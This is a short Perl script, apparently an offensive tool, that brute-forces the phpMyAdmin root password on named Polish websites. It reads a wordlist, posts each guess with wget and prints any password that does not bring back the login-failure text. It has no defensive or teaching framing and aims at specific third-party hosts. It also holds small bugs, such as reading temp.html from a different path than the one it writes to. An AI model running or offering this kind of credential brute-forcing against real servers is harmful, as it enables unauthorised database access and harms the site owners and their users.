#!/bin/perl

#	`wget --save-cookies cookies.txt --post-data "pma_username=root&pma_password=$line"  -O /tmp/temp.html http://z7.ipartner.com.pl/phpmyadmin/ -b -q 2>1 >> /dev/null`;
#	$temp=`cat /tmp/temp.html |grep $cannot`;




use strict;
use warnings;

my $file = 'wejscie.txt';
open my $info, $file or die "Could not open $file: $!";

while( my $line = <$info>)  {   
#    print "Checking: " . $line;    
    `wget --save-cookies cookies.txt --post-data "pma_username=root&pma_password=$line"  -O /tmp/temp.html http://ride4fun.com.pl/phpmyadmin/ -b -q 2>1 >> /dev/null`;
    sleep 1;
	open(FILE2,"temp.html");
	if ( grep{/annot/} <FILE2> ){
	}
	else {
		print "pass found: " . $line . "\n";
	}
	close FILE2;
}
close $info;


